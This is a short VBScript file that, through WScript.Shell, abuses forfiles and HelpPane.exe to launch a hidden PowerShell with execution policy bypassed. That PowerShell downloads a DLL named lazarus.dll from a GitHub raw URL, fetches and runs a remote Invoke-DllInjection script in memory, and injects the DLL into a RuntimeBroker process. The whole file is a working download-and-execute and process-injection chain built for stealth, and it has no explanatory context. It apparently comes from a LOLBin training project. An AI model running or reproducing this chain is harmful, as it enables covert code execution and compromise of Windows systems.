Set objShell = CreateObject("Wscript.Shell")
objShell.Run "forfiles /p C:\Windows /m HelpPane.exe /c ""powershell.exe -w hidden -exec bypass -nop -noexit -c iwr -Uri https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/dll/lazarus.dll -OutFile %TEMP%\lazarus.dll; $pidnumber=Get-Process -Name RuntimeBroker; iex (iwr https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/ps1/Invoke-DllInjection.ps1 -UseBasicParsing);Invoke-DllInjection -ProcessID $pidnumber.Id[1] -Dll %TEMP%\lazarus.dll""", 0, True